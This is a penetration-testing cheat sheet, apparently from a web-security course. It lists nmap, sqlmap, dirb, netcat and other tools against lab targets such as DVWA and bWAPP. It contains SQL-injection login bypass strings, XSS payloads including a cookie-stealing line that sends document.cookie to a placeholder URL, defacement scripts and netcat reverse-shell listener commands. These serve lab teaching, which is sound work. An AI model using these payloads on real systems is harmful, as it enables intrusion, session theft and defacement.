# Common Test Tools Cheat Sheet

## Command to run before executing any commands

sudo su

## Software available in Kali Linux and its uses

### Nmap 

Determine host info, opened ports and its relevant services.

#### OS DETECTION

- `-O` enables OS detection

        nmap -O <ip>

#### HOST DISCOVERY

- `Pn` Treat all host as online (Skips host discovery)

        nmap -Pn <ip>

#### SERVICE/VERSION DETECTION

- `sV` Probe the open ports and determine service info

        nmap -sV <ip>

#### SCAN TECHNIQUES

- `sS` TCP SYN Scans

        nmap -sS <ip>

#### TIMING AND PERFORMANCE

- `-T<0-5>` Set timing template (the higher the faster)

        nmap -T4 <ip>

#### PORT SPECIFICATION AND SCAN ORDER

- `-p <port range>` Only scan specified ports
    - `-p-` specifies all ports

            nmap -p- <ip> 
            nmap -p 80,443 <ip>

### whatweb 

Web Server Mapping

#### OUTPUT

- `-v` include detailed plugin descriptions.

        whatweb -v <http://Website_ip_address>

#### AGGRESSION

- `-a=<level>` Define aggression level (default -a=1)

|Aggression level|Description|
|--|--|
|Stealthy|Makes one HTTP request per target and also follows redirects|
|Aggressive|If a level 1 plugin is matched, additional requests will be made|
|Heavy|Makes a lot of HTTP requests per target. URLs from all plugins are attempted|

        whatweb -v <http://Website_ip_address>

#### Curl Tool

Mapping of methods supported by web server

    (Bee Box)
    curl -X OPTIONS <http://Website_ip_address> -i

    (OWASP_BWA)
    curl -X GET <http://Website_ip_address> -i

    (OWASP_BWA)
    curl -d "<document file path>" -X PUT <http://Website_ip_address> -v

    (OWASP_BWA)
    curl -d "<document file path>" -X POST <http://Website_ip_address> -v

    (OWASP_BWA)
    curl -X DELETE <http://Website_ip_address> -v

    curl -X HEAD <http://Website_ip_address> -v

### dirb

Brute force directory paths

#### OPTIONS

- `-N <Response Code>` Ignore responses with this code

        dirb <http://Website_ip_address/> -N 302

- `-x <extension file>` Append each word with this extension

        dirb <http://Website_ip_address/> -x .php

### WPScan

- `--enumerate <option>` / `-e <option>` enumerate with the following options
    - `u` user ID range

            wpscan --url http://192.168.93.130/wordpress --enumerate u

### OWASP ZAP

 [Basic Spidering](/Week%202/Basic%20Spidering.md)

 [Basic Fuzzing](/Week%202/Basic%20Fuzzing.md)

### NetCat

- Set up listener
        
        nc -lvp <port number>

- Send the NetCat traffic from
        
        nc <ip address of kali> -p <port number>

### Commix

- `--url,  <URL of the Website>`
- `--cookie= <Cookie Captured in ZAP Post Request>`
- `--data= <Data Sent By ZAP Post Request>`

### sqlmap

`Refer to Week 4.1-OWASP Top 10-A03-Injection-Part 1-v2`

- Basic detection
```
sqlmap -u "<url>" --random-agent --timeout=1000
```
`-u` target url to inject

- List databases
```
sqlmap -u "<url>" --random-agent --timeout=1000 --dbs
```

- List tables
```
sqlmap -u "<url>" --random-agent --timeout=1000 --tables -D <database_name>
```

### beEF

- Post XSS to collect credentials and run exploits
- Any XSS vulnerable website

## Website and tools used for conducting what scan / exploit

### Credential Brute Forcing attack

- WordPress (OWASP_BWA)
http://192.168.93.130/wordpress/ 

    OWASP ZAP Fuzzing

### OS Command Line Injection

- Mutillidae (OWASP_BWA)
http://192.168.93.130/mutillidae/index.php?page=dns-lookup.php

- DVWA (OWASP_BWA)
http://192.168.93.130/dvwa/vulnerabilities/exec/

- bWAPP (Bee Box)
https://192.168.93.136/bWAPP/commandi.php 

### SQL Injection 

- MySQL
    - `' OR 1=1 #`
    - `' OR 1=1 -- `
- Oracle / Microsoft / Postgres
    - `' OR 1=1 --`

- DVWA (OWASP_BWA)
https://192.168.93.130/dvwa/vulnerabilities/sqli/

- Mutillidae (OWASP_BWA)
https://192.168.93.130/mutillidae/index.php?page=login.php&popUpNotificationCode=LOU1

- bWAPP (Bee Box)
https://192.168.93.136/bWAPP/sqli_16.php

### XSS / Stored XSS (Use beEF)

 - Create a harmless alert.
```
<script>alert("Vulnerable to XSS")</script>
```

 - Redirect to browser to another site.
```
<script>windows.location="<url>"</script>
```

 - iFrame embedding
```
<iframe src="<url>"></iframe>
```

 - Obtain/Stealing cookie data
```
<script>alert(document.cookie)</script>

<script>document.write('<img src="<url>' + document.cookie + ' ">');</script>
```

 - Deface the website
```
<script>document.body.bgColor="black"</script>

<img src=x onerror="document.body.innerHTML='<h1>Web Site Defaced ! You need to do a re-setup </h1>'">
```

### Reverse Shell

`Refer to week 4.2`

- Mutillidae (OWASP_BWA)
http://192.168.93.130/mutillidae/index.php?page=dns-lookup.php

- DVWA (OWASP_BWA)
http://192.168.93.130/dvwa/vulnerabilities/exec/

- bWAPP (Bee Box)
https://192.168.93.136/bWAPP/commandi.php 

Commix (OWASP_BWA)
NetCat (Bee Box)

### Session Hijacking

`Refer to week 2.2`

- WebGoat (OWASP_BWA)
https://192.168.93.130/WebGoat/attack

- WackoPicko (OWASP_BWA)  
https://192.168.93.130/WackoPicko/

### HTML Injection

- Inject a HTML code into a webpage
- Example: 

                <h1>Hello</h1>

- bWAPP (Bee Box)

### Stored HTML Injection

 [Stored HTML Injection](/Week%204/Stored%20HTML%20Injection%20(Blog).md)

- bWAPP (Bee Box)
https://192.168.93.136/bWAPP/htmli_stored.php

### Arbitrary File Access (Samba)

`Refer to Week 7.1-OWASP Top 10-A05-Security Misconfiguration-v2`

### Unrestricted File Upload Due to Security Misconfiguration

`Refer to Week 7.1-OWASP Top 10-A05-Security Misconfiguration-v2`

## Database Errors
Different database software has different error messages

- MySQL:
```
You have an error in your SQL syntax; ...
```

- Oracle:
```
ORA-00933: SQL command not properly ended
```

- MS SQL Server:
```
Microsoft SQL Native Client error '80040e14' ...
```